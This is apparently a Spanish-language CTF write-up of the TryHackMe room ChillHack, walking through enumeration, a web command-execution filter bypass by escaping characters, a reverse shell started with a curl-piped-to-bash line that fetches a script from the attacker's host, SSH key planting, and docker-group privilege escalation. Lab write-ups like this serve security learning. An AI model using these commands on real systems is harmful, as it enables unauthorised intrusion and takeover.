---
title: ChillHack
layout: post
post-image: "../assets/images/Rooms/ChillHack/chillhack.png"
description: Easy level CTF. Capture the flags and have fun!
difficulty: Fácil
enlace: https://tryhackme.com/r/room/chillhack
tags:
- Enumeración
- Web
- Reverse shell
- Privilege Escalation
---

Primero de todo, vamos a realizar un escaneo de los puertos de la dirección ip de la máquina víctima:
<div style="text-align: left;">
  <table>
    <tr>
      <td style="vertical-align: top;">
        <div style="text-align: center;">
          <img src="../assets/images/Rooms/ChillHack/image.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;">
        </div>
      </td>
      <td style="vertical-align: top;">
        <div style="text-align: center;">
          <img src="../assets/images/Rooms/ChillHack/image 1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;">
        </div>
      </td>
    </tr>
  </table>
</div>

<div style="text-align: center;">
  <img src="../assets/images/Rooms/ChillHack/image 2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;">
</div>
Vemos que tiene abierto los puertos **21** (conexión servicio FTP), **22** (conexión servicio SSH) y **80** (página web no encriptada "http").

Primero, vamos a iniciar una conexión anónima en el servidor *FTP*, debido a que permite dicho tipos de conexiones:
<div style="text-align: center;">
  <img src="../assets/images/Rooms/ChillHack/image 4.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;">
</div>

Vemos que al iniciar sesión, y realizar un listado de los archivos encontramos un fichero **note.txt** que podemos descargar en nuestra máquina mediante el comando `get`.
![[image 4.png]]
Vemos que el fichero contiene dos usuarios **Anurodh** y **Apaar**.
Como aquí no podemos seguir haciendo nada, vamos a ver que encontramos la página web:
![[image 5.png]]
Como de costumbre, no encontramos nada a simple vista, por lo que vamos a realizar *fuzzing web* con `gobuster`:
![[image 6.png]]
Encontramos un directorio oculto, llamado `/secret` que si accedemos a él encontramos un campo donde podemos ejecutar código, por lo que estamos ante un *RCE*:
![[image 7.png]]
Si ejecutamos un comando más interesante como puede ser `cat /etc/passwd` obtenemos como resultado:
![[image 8.png]]
Podemos interceptar la petición del CRE mediante *burpsuite*, donde podemos enviar los comandos pero intentando bypassear la "protección", por ejemplo:
![[image 9.png]]
Hemos hecho un bypass del comando `ls -la` escapando la s, por lo que podemos llevarlo a la práctica con otros comandos:

![[image 10_1.png]]

![[image 10_2.png]]
Vemos que si escapamos el comando `cat /index.php` encontramos los comandos que no se pueden ejecutar de manera normal.
Por lo que, podemos intentar ejecutar una *reverse shell* desde la página web:
![[image 12.png]]
Ahora, en la web vamos a ejecutar el comando:
```bash
curl http://ip_nuestra/nombre_shell | ba\sh 
```
para poder obtener la *reverse shell* y seguido ejecutarla escapando el comando `bash`.

--- start-multi-column: ID_gb15
```column-settings
Number of Columns: 2
Largest Column: standard
```

![[image 13.png]]

Como resultado, tenemos que al escuchar y ejecutar la shell, estamos dentro del servidor.

--- column-break ---

![[image 14.png]]

--- end-multi-column
Ahora dentro, podemos intentar escalar privilegios. Por lo que podemos hacer uso del comando -> `sudo -l` para obtener los comandos que puede ejecutar como root el usuario *www-data*.
![[image 15.png]]

En efecto, vemos que el comando `/home/apaaar/.helpline.sh` pueden ejecutarlos todos los usuarios del sistema.
Como es un script escrito en **bash** podemos ver su contenido:
![[image 16.png]]

Y vemos que lo que realiza es una interacción, donde nos pide un nombre y un mensaje.
![[image 17.png]]

Si ejecutamos el comando especificando el usuario `-u apaar` y en el mensaje escribimos `/bin/bash` (ejecución de una terminal), esta se ejecutará como **apaar** (ya que hemos especificado su usuario).

Tratamiento de la tty (para poder tener una CLI más amigable):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
(ctrl + Z)
stty raw -echo;fg
stty rows 29 columns 126
export TERM=screen
```

Procedemos a buscar la flag y la tenemos.
![[image 18.png]]

Ahora, para seguir continuando con el CTF, vamos a realizar una escalada de privilegios pero ahora a root, para poder conseguir así la última flag.
Podemos realizar una búsqueda de binarios (spoiler, no va a servir de nada).

Ya que estamos dentro del servidor podemos echarle un ojo a los puertos que tiene abierto y vemos que tiene en escucha uno muy raro -> `127.0.0.1:9001`.
![[image 19.png]]
![[image 23.png]]
Encontramos un panel de login, que puede cuadrar con el servicio *SSH* que hay corriendo por el puerto 22, por lo que podemos buscar el **id_rsa** del usuario **apaar** para poder iniciar sesión.

Pero primero, vamos a volver a hacer *fuzzing web* a esta web:
![[image 27.png]]
y vemos que tenemos un directorio llamado `/images`, si accedemos a él encontramos dos archivos, el que nos interesa es el '.jpg'.
![[image 28.png]]
```bash
wget hacker-with-laptop_23-2147985341.jpg
```
Como tenemos una imagen con extensión '.jpg' podemos hacer uso de `steghide` para poder encontrar información oculta en la imagen:
![[image 29.png]]
Y esto no da un archivo llamado 'backup.zip', el cual si queremos descomprimir nos pedirá una contraseña, la cual podemos intentar romper con un ataque de fuerza bruta, con `fcrackzip`:
![[image 30.png]]
Tenemos la contraseña del '.zip', vamos a abrirlo:
```bash
unzip backup.zip
nano source_code.php
```
![[image 31.png]]
Encontramos la contraseña del otro usuario **Anurodh**, la cual está encriptada en base64, la desencriptamos y nos la guardamos:
```bash
echo -e "contraseña_base64" | base64 -d
```

Y ahora si, vamos a proceder a obtener las claves *id_rsa* del usuario **apaar**, para ello vamos al directorio donde estas se almacenan:
```bash
cd /home/apaar/.shh
```
![[image 20.png]]
Vemos que no tenemos el **id_rsa** como tal, si no que tenemos un fichero llamado 'authorized_key' que son las claves permitidas y autorizadas para poder realizar la conexión vía *SSH*.
Pero nosotros podemos crear una clave e introducirla en dicho fichero ya que tenemos permisos de escritura en el mismo.
![[image 21.png]]

Con `ssh-keygen` podemos crear una clave para el usuario **apaar** y tenemos tanto el **id_rsa** (apaar) como el **id_rsa.pub** (apaar.pub).

A continuación, guardamos *apaar.pub* en el fichero 'authorized_keys' y apaar en un archivo *id_rsa* en nuestra máquina y podremos realizar nuestro inicio de sesión vía *SSH*.
![[image 22.png]]
Ahora que estamos dentro y previamente obtuvimos la contraseña del usuario **Anurodh**, mediante el comando `su Anurodh` y su contraseña nos convertiremos en dicho usuario:
![[image 33.png]]
![[image 34.png]]
Con el comando `id` vemos información acerca del usuario actual y vemos que pertenece al grupo **docker**, es decir, tiene permisos para poder ejecutar comandos Docker y puede acceder al *daemon* Docker.

Podemos buscar en [GTFObins/Docker](https://gtfobins.github.io/gtfobins/docker/#shell) un exploit para escalar privilegios y en efecto, hemos escalado privilegios, ergo somos usuarios root.
![[image 35.png]]
Hemos obtenido la root flag, por lo que hemos terminado el CTF.
___
